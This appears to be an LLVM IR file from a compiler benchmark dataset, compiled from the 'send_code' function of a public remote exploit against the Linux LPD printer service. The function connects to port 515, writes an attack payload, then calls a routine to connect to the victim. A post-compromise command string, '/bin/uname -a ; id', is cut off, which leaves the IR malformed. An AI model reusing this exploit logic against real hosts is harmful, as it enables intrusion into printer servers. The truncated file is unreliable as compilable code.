; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_227.c_send_code.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_227.c_send_code.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i64 }
%struct.sockaddr_in = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@send_code.testcmd = internal global [256 x i8] c"/bin/uname -a ; idalign 16
@AF_INET = common dso_local global i32 0, align 4
@he = common dso_local global %struct.TYPE_4__* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"--- [5] Unable to create socket!\0A\00", align 1
@.str.1 = private unnamed_addr constant [17 x i8] c"Exploit failed!\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"--- [5] Unable to connect to %s\0A\00", align 1
@hostname = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [40 x i8] c"Exploit failed, %s is not running LPD!\0A\00", align 1
@DELAY = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [28 x i8] c"Couldn't write to socket %d\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"Exploit failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_code(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca [1024 x i8], align 16
  store i8* %0, i8** %2, align 8
  %8 = load i32, i32* @AF_INET, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  store i32 %8, i32* %9, align 4
  %10 = call i32 @htons(i32 515)
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 1
  store i32 %10, i32* %11, align 4
  %12 = load %struct.TYPE_4__*, %struct.TYPE_4__** @he, align 8
  %13 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 0
  %14 = load i64, i64* %13, align 8
  %15 = inttoptr i64 %14 to i32*
  %16 = load i32, i32* %15, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 0
  %18 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %17, i32 0, i32 0
  store i32 %16, i32* %18, align 4
  %19 = load i32, i32* @AF_INET, align 4
  %20 = load i32, i32* @SOCK_STREAM, align 4
  %21 = call i32 @socket(i32 %19, i32 %20, i32 0)
  store i32 %21, i32* %3, align 4
  %22 = icmp slt i32 %21, 0
  br i1 %22, label %23, label %27

23:                                               ; preds = %1
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  %26 = call i32 @exit(i32 -1) #3
  unreachable

27:                                               ; preds = %1
  %28 = load i32, i32* %3, align 4
  %29 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %30 = call i64 @connect(i32 %28, %struct.sockaddr* %29, i32 12)
  %31 = icmp slt i64 %30, 0
  br i1 %31, label %32, label %38

32:                                               ; preds = %27
  %33 = load i8*, i8** @hostname, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i8* %33)
  %35 = load i8*, i8** @hostname, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.3, i64 0, i64 0), i8* %35)
  %37 = call i32 @exit(i32 -1) #3
  unreachable

38:                                               ; preds = %27
  %39 = load i32, i32* @DELAY, align 4
  %40 = call i32 @usleep(i32 %39)
  %41 = load i32, i32* %3, align 4
  %42 = load i8*, i8** %2, align 8
  %43 = load i8*, i8** %2, align 8
  %44 = call i32 @strlen(i8* %43)
  %45 = call i64 @write(i32 %41, i8* %42, i32 %44)
  %46 = icmp slt i64 %45, 0
  br i1 %46, label %47, label %52

47:                                               ; preds = %38
  %48 = load i32, i32* %3, align 4
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0), i32 %48)
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %51 = call i32 @exit(i32 2) #3
  unreachable

52:                                               ; preds = %38
  %53 = load i32, i32* %3, align 4
  %54 = call i32 @close(i32 %53)
  %55 = call i32 (...) @connect_victim()
  ret void
}

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i64 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @connect_victim(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
